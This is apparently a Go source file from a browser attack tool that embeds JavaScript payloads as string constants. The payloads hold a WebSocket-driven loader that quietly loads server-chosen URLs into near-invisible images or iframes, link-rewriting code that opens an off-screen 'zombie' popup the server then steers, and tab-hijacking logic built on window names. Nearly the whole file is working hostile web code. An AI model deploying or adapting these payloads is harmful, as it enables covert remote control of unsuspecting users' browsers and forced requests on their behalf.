package core

const loadFromWS = `
var ws;
function start() {
	ws = new WebSocket('ws://' + location.host + '/ws/whatever');

	//ws.addEventListener('open', function (event) {
	//	ws.send('Hello Server!');
	//});

	ws.addEventListener('message', function (event) {
		guess(event.data);
	});
}
`

const loadImg = `
var elem = document.createElement("img");
elem.setAttribute("src", "");
elem.setAttribute("height", "10px");
elem.setAttribute("width", "10px");
elem.setAttribute("id", "guessElem");
elem.setAttribute("style", "opacity:0.01");
document.documentElement.appendChild(elem);

function guess(v) {
	document.getElementById("guessElem").src = v;
}

start();
`

const loadIFrame = `
var elem = document.createElement("iframe");
elem.setAttribute("src", "");
elem.setAttribute("height", "10px");
elem.setAttribute("width", "10px");
elem.setAttribute("id", "guessElem");
elem.setAttribute("style", "opacity:0.01");
document.documentElement.appendChild(elem);

function guess(v) {
	document.getElementById("guessElem").src = v;
}

start();
`

const loadOpen = `
if (window.name != 'zombie') {
	window.name = 'control';
}

var mywin;

function guess(v) {
	mywin.location.replace(v);
}

function OpenAndExit(elem) {
	mywin = window.open(elem.href, 'zombie', 'height=150, width=100, top=10000, left=10000');
	start();
}

if (window.name == 'control') {
	var as = document.documentElement.getElementsByTagName('a');
    for ( i = 0 ; i < as.length ; i++ ) {
		var elem = as[i];
		elem.setAttribute("onclick", "OpenAndExit(elem);");
		elem.removeAttribute("href");
	}
}
`

const loadTab = `
if (window.name != 'control') {
	window.name = 'zombie';
}

var mywin;

function guess(v) {
	mywin.location.replace(v);
}

if (window.name == 'zombie') {
	var as = document.documentElement.getElementsByTagName('a');
    for ( i = 0 ; i < as.length ; i++ ) {
		var elem = as[i];
		if ( elem.href.startsWith("http://") ) {
			var oc = "window.open('" + elem.href + "', 'control');";
			elem.setAttribute("onclick", oc);
			elem.removeAttribute("href");
		}
	}
}

if (window.name == 'control') {
	mywin = window.open("","zombie");
	elem = document.documentElement;
	var oml = "mywin.location.replace('" + mywin.location + "'); mywin='';";
	elem.setAttribute("onmouseleave", oml);
	start();
}
`

const measureTiming = `

`

const defaultHTML = `
<H1>HELLO WORLD</H1>
<a href='/other.html'>
<img src='https://s-media-cache-ak0.pinimg.com/originals/13/7c/a9/137ca9e2a4de70b11d0ae475997e8004.gif'>
</a>
<script src='/whatever.js'></script>
`
